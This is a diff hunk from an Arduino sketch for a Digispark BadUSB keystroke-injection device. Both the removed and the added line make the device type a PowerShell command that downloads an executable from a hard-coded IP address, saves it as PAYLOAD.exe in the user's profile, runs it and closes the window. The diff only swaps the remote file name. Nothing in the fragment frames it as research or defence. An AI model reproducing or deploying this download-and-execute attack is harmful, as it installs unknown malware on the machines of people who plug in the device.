@@ -23,7 +23,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("wget http://137.184.197.191/cjknakwudiqwndasdnuiqwljasbcxs.exe -OutFile $env:userprofile\\PAYLOAD.exe; start-process $env:userprofile\\PAYLOAD.exe; stop-process -Id $PID");
+  DigiKeyboard.print("wget http://137.184.197.191/iasudhqiwdnqkjndaksdniqwdqw.exe -OutFile $env:userprofile\\PAYLOAD.exe; start-process $env:userprofile\\PAYLOAD.exe; stop-process -Id $PID");
   
   DigiKeyboard.delay(500);
   
